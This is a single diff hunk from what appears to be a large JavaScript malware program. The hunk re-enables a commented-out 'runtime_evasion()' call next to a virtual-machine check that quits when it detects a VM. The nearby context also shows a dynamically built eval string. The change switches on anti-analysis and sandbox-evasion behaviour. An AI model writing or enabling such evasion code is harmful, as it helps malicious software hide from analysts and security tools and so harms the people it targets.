@@ -4218,7 +4218,7 @@ return ${eval_string};
 
         const exit = await this.utils.protection.inVM();
 
-        //this.runtime_evasion();
+        this.runtime_evasion();
 
         if (exit) {
           process.exit(0);
